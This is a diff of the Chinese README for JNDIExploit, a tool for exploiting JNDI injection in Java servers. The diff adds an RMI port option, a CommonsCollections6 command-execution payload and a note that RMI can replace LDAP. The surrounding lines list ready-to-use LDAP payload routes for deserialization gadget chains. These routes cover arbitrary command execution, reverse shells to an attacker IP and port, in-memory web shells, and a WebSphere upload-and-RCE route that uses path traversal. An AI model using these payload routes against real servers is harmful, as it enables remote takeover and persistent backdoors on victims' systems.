@@ -2,7 +2,9 @@
 
 一款用于 ```JNDI注入``` 利用的工具，大量参考/引用了 ```Rogue JNDI``` 项目的代码，支持直接```植入内存shell```，并集成了常见的```bypass 高版本JDK```的方式，适用于与自动化工具配合使用。
 
-对大佬的项目https://github.com/WhiteHSBG/JNDIExploit做了一点点些微的优化，加了CC6，RMI，还对回显做了一点优化。
+对大佬的项目https://github.com/WhiteHSBG/JNDIExploit 做了一点点些微的优化，加了CC6，RMI，还对回显做了一点优化。
+
+后面学习到了新的链子，也会往里面加进去。
 
 ---
 
@@ -22,6 +24,7 @@
 Usage: java -jar JNDIExploit.jar [options]
   Options:
   * -i, --ip       Local ip address
+    -rl, --rmiPort rmi bind port (default: 10990)
     -l, --ldapPort Ldap bind port (default: 1389)
     -p, --httpPort Http bind port (default: 8080)
     -u, --usage    Show usage (default: false)
@@ -56,6 +59,7 @@ Supported LADP Queries：
     ldap://0.0.0.0:1389/Deserialization/URLDNS/[domain]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/CommonsCollections6/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils2/TomcatEcho
     ldap://0.0.0.0:1389/Deserialization/C3P0/SpringEcho
@@ -90,6 +94,8 @@ Supported LADP Queries：
     ldap://0.0.0.0:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported
     ldap://0.0.0.0:1389/WebsphereBypass/Upload/WebsphereMemshell
     ldap://0.0.0.0:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp
+    
+    以上可以将 <ldap://> 替换为 <rmi://>
 ```
 * 目前支持的所有 ```PayloadType``` 为
   * ```Dnslog```: 用于产生一个```DNS```请求，与 ```DNSLog```平台配合使用，对```Linux/Windows```进行了简单的适配
